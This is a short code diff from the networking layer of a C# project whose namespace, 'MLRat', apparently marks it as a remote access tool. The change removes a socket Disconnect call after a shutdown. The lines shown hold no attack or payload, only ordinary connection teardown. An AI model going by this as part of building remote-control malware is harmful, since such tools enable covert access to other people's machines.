@@ -301,7 +301,6 @@ namespace MLRat.Networking
                     if (NetworkSocket != null && NetworkSocket.Connected)
                     {
                         NetworkSocket.Shutdown(SocketShutdown.Both);
-                        NetworkSocket.Disconnect(true);
                     }
                 }
             }
